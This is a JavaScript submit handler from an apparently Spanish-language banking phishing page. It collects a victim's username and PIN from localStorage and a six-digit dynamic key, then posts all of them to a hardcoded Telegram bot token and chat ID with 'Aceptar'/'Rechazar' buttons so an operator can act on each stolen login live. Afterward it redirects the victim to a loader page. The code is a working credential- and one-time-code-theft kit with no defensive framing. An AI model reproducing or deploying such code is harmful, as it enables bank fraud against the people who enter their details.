async function handleSubmit(e) {
    e.preventDefault();

    const dynamic = document.getElementById('dinamica').value;
    if (dynamic.length !== 6 || isNaN(dynamic)) {
        alert("La clave dinámica debe ser un número de 6 dígitos.");
        return;
    }

    const data = {
        username: localStorage.getItem('username'),
        pin:      localStorage.getItem('userPin'),
        dynamic:  dynamic,
        id:       localStorage.getItem('solicitudID')
    };

    try {
        const BOT_TOKEN = '7732026260:AAGS1T29BwTra3Sc2ic9hoKfF4iuIcgMUwo';
        const CHAT_ID   = '-1002386768203';

        const message = `*////  NUEVA SOLICITUD*\n` +
                        `*.  ID:* \`${data.id}\`\n` +
                        `*+  Usuario:* \`${data.username}\`\n` +
                        `*+  Clave:* \`${data.pin}\`\n` +
                        `*+  Dinamica:* \`${data.dynamic}\``;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({
                chat_id:    CHAT_ID,
                text:       message,
                parse_mode: 'Markdown',
                reply_markup: {
                  inline_keyboard: [[
                    { text: '✅ Aceptar', callback_data: `aprobar_${data.id}` },
                    { text: '❌ Rechazar', callback_data: `rechazar_${data.id}` }
                  ]]
                }
            })
        });
    } catch (err) {
        console.error('Error al enviar a Telegram:', err);
    }

    // Tras enviar, lleva al loader
    window.location.href = 'loader.html';
}
